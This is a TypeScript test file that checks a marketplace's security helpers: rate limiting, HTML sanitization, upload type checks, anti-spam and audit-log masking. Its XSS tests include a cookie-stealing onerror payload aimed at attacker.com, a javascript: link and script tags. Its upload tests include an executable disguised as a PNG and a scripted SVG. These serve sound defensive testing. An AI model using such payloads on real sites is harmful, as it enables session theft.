import { describe, it, expect, beforeEach } from "vitest";
import {
  checkRateLimit,
  resetRateLimitKeyForTesting,
} from "../rate-limit";
import {
  sanitizeRichText,
  sanitizePlainText,
  escapeHtml,
} from "../sanitizer";
import {
  detectMimeFromBuffer,
  validateUploadFile,
  generateSafeStoragePath,
  isMaliciousSvg,
} from "../file-security";
import {
  checkContactLeak,
  checkDuplicateSpam,
} from "../anti-abuse";
import {
  maskSensitiveFields,
  hashIp,
  recordAuditEvent,
  getAuditLogs,
} from "../audit";

describe("1. Rate Limiting & Brute-Force Lockout", () => {
  const testKey = "test-ip-127.0.0.1";

  beforeEach(() => {
    resetRateLimitKeyForTesting(testKey);
  });

  it("permits requests within configured threshold", () => {
    const res1 = checkRateLimit(testKey, { maxRequests: 3, windowSeconds: 10 });
    expect(res1.allowed).toBe(true);
    expect(res1.remaining).toBe(2);

    const res2 = checkRateLimit(testKey, { maxRequests: 3, windowSeconds: 10 });
    expect(res2.allowed).toBe(true);
    expect(res2.remaining).toBe(1);
  });

  it("blocks requests and applies exponential lockout when threshold exceeded", () => {
    // 3 requests allowed
    checkRateLimit(testKey, { maxRequests: 2, windowSeconds: 5, blockMultiplier: 2 });
    checkRateLimit(testKey, { maxRequests: 2, windowSeconds: 5, blockMultiplier: 2 });

    // 3rd request violates limit
    const violation = checkRateLimit(testKey, { maxRequests: 2, windowSeconds: 5, blockMultiplier: 2 });
    expect(violation.allowed).toBe(false);
    expect(violation.remaining).toBe(0);
    expect(violation.retryAfter).toBeGreaterThan(0);
    expect(violation.message).toContain("Rate limit exceeded");
  });
});

describe("2. Stored XSS Prevention & Input Sanitization", () => {
  it("strips malicious <script> tags completely", () => {
    const dirty = '<p>Hello world</p><script>alert("XSS Attack!");</script>';
    const clean = sanitizeRichText(dirty);
    expect(clean).not.toContain("<script");
    expect(clean).not.toContain("alert(");
    expect(clean).toContain("<p>Hello world</p>");
  });

  it("neutralizes inline event handlers like onerror and onload", () => {
    const dirty = '<img src="x" onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">';
    const clean = sanitizeRichText(dirty);
    expect(clean).not.toContain("onerror");
    expect(clean).not.toContain("attacker.com");
  });

  it("neutralizes javascript: URI schemes in anchors", () => {
    const dirty = '<a href="javascript:stealToken()">Click to view brief</a>';
    const clean = sanitizeRichText(dirty);
    expect(clean).not.toContain("javascript:");
  });

  it("preserves safe formatting tags and adds rel=noopener noreferrer on external links", () => {
    const safe = '<p>Check our <b>ComfyUI</b> pipeline at <a href="https://cacheflow.ai/docs">documentation</a>.</p>';
    const clean = sanitizeRichText(safe);
    expect(clean).toContain("<b>ComfyUI</b>");
    expect(clean).toContain('rel="noopener noreferrer"');
    expect(clean).toContain('target="_blank"');
  });

  it("sanitizePlainText strips all HTML tags and collapses newlines", () => {
    const dirty = "Cyberpunk <b>Director</b>\n\n\t<script>bad()</script>";
    const clean = sanitizePlainText(dirty);
    expect(clean).toBe("Cyberpunk Director bad()");
  });
});

describe("3. File Upload Security & Magic-Byte Detection", () => {
  it("detects PNG by magic bytes 89 50 4E 47", () => {
    const pngHeader = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    expect(detectMimeFromBuffer(pngHeader)).toBe("image/png");
  });

  it("detects MP4 by 'ftyp' box signature at offset 4", () => {
    // 00 00 00 18 66 74 79 70 ('ftyp')
    const mp4Header = new Uint8Array([
      0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6d, 0x70, 0x34, 0x32,
    ]);
    expect(detectMimeFromBuffer(mp4Header)).toBe("video/mp4");
  });

  it("rejects Windows PE executable disguised as PNG", () => {
    // Starts with 'MZ' (0x4D, 0x5A)
    const spoofedExe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    const result = validateUploadFile(spoofedExe, "avatars", "avatar.png");
    expect(result.valid).toBe(false);
    expect(result.error).toContain("Executable files are strictly prohibited");
  });

  it("rejects malicious SVGs containing embedded scripts", () => {
    const maliciousSvg = new TextEncoder().encode(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    );
    expect(isMaliciousSvg(maliciousSvg)).toBe(true);

    const safeSvg = new TextEncoder().encode(
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="5"/></svg>'
    );
    expect(isMaliciousSvg(safeSvg)).toBe(false);
  });

  it("generates isolated randomized storage paths scoped to userId", () => {
    const path = generateSafeStoragePath("user-1234", "mp4");
    expect(path.startsWith("user-1234/")).toBe(true);
    expect(path.endsWith(".mp4")).toBe(true);
    expect(path).toMatch(/user-1234\/[a-f0-9-]{36}\.mp4/);
  });
});

describe("4. Anti-Disintermediation & Anti-Spam", () => {
  it("flags off-platform phone numbers and WhatsApp solicitation", () => {
    const text = "Great project! Let's chat on WhatsApp at +1 (555) 234-5678 to discuss terms.";
    const check = checkContactLeak(text);
    expect(check.hasContactLeak).toBe(true);
    expect(check.warningMessage).toContain("all contracts, communication, and payments must remain on CacheFlow");
  });

  it("flags off-platform payment attempts via PayPal/Crypto", () => {
    const text = "Can you send the deposit via paypal or bitcoin instead of escrow?";
    const check = checkContactLeak(text);
    expect(check.hasContactLeak).toBe(true);
  });

  it("allows normal creative and production discourse without false alarms", () => {
    const text = "I specialize in FLUX.1 [dev] and AnimateDiff temporal consistency. 4K ProRes delivery.";
    const check = checkContactLeak(text);
    expect(check.hasContactLeak).toBe(false);
  });

  it("detects rapid duplicate spam submissions", () => {
    const user = "user-spam-test";
    const msg = "Hey hire me for this brief, I am ready right now!";

    const first = checkDuplicateSpam(user, msg, 30);
    expect(first.isSpam).toBe(false);

    const second = checkDuplicateSpam(user, msg, 30);
    expect(second.isSpam).toBe(true);
    expect(second.reason).toContain("Duplicate submission detected");
  });
});

describe("5. Audit Logging & Sensitive Data Masking", () => {
  it("masks passwords, tokens, and secrets in audit logs", () => {
    const unmasked = {
      email: "user@test.com",
      password: "SuperSecretPassword123!",
      totpSecret: "JBSWY3DPEHPK3PXP",
      apiKey: "secret_live_key_999",
      role: "creator",
    };

    const masked = maskSensitiveFields(unmasked) as Record<string, unknown>;
    expect(masked.email).toBe("user@test.com");
    expect(masked.role).toBe("creator");
    expect(masked.password).toBe("********");
    expect(masked.totpSecret).toBe("********");
    expect(masked.apiKey).toBe("********");
  });

  it("anonymizes raw IP addresses using salted hash", () => {
    const ip = "192.168.1.100";
    const hashed = hashIp(ip);
    expect(hashed).not.toContain("192.168.1.100");
    expect(hashed.startsWith("ip_")).toBe(true);
  });

  it("records immutable audit log entries", () => {
    const event = recordAuditEvent({
      actorId: "admin-uuid",
      actorRole: "admin",
      action: "user.verify",
      targetType: "user",
      targetId: "creator-uuid",
      ipAddress: "10.0.0.1",
      metadata: { verifiedBadge: "deterministic_pipeline" },
    });

    expect(event.id.startsWith("audit-")).toBe(true);
    expect(event.ipAddress).toBeUndefined(); // raw IP stripped
    expect(event.ipHash.startsWith("ip_")).toBe(true);
    expect(getAuditLogs()).toContain(event);
  });
});
